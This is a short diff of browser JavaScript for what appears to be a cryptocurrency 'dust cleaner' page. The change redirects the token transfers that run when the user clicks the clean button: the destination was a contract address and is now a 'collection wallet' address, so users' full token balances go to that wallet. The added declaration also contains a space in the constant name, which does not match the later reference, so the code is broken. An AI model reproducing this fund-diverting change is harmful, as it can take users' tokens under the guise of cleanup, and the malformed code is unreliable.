@@ -3,8 +3,8 @@ const dustContainer = document.getElementById("dustContainer");
 const cleanButton = document.getElementById("cleanButton");
 const statusDiv = document.getElementById("status");
 
-const CONTRACT_JIMTOK =
-"0xC8c75f020A9CCA652e9D2C2c13Fa3C7522D2626a";
+const COLLECTION WALLET =
+"0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";
 
 let provider;
 let signer;
@@ -181,7 +181,7 @@ cleanButton.onclick = async () => {
 
             const tx =
             await tokenContract.transfer(
-                CONTRACT_JIMTOK,
+                COLLECTION_WALLET,
                 BigInt(token.balance)
             );
 
